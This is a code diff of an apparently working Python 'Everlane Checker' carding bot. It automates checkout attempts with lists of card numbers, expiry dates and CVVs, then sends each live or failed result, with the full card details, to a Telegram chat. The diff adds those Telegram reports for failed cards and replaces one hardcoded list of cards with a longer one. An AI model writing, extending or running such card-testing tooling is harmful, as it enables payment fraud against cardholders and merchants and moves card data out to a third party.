@@ -187,10 +187,7 @@ def livear(cc_namso):
 
     if bot.locate('thanks', click=False) or bot.locate('live', click=False) or bot.locate('survey', click=False):
         print(f'CC: {cc} - Live!')
-
-        content = f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE! ✅\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}"
-
-        telegram(content, '-726102881')
+        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: LIVE! ✅\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}", '-726102881')
         bot.press_both('ctrl', 'l')
         bot.copypaste('chrome://settings/clearBrowserData')
         bot.press('enter')
@@ -202,8 +199,10 @@ def livear(cc_namso):
 
     elif bot.locate('error1', click=False):
         print('There was a problem processing your card. Please call your card issuer or try a different card.')
+        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}\n\n📝 Details:\nThere was a problem processing your card. Please call your card issuer or try a different card.", '-726102881')
     elif bot.locate('out_funds', click=False):
         print('Your card appears to be out of funds. Please try a new one.')
+        telegram(f"💸 Everlane Checker 💸\n\n📬 STATUS: FAIL! ❌\n\nCC: {cc[0]}\nEXP: {cc[1]}/{cc[2]}\nCVV: {cc[3]}\n\n📝 Details:\nYour card appears to be out of funds. Please try a new one.", '-726102881')
 
     
 # Logica
@@ -211,9 +210,16 @@ def livear(cc_namso):
 def main():
 
     ccs = """
-5217295329245041|11|2023|330
-5217295329212850|11|2023|642
-5217295329201127|11|2023|772
+5217295329214138|11|2023|724
+5217295329225621|11|2023|401
+5217295329226728|11|2023|124
+5217295329267854|11|2023|370
+5217295329215564|11|2023|170
+5217295329218147|11|2023|385
+5217295329282010|11|2023|331
+5217295329220150|11|2023|432
+5217295329288801|11|2023|232
+5217295329241073|11|2023|354
     """
 
     preparar_worksplace()
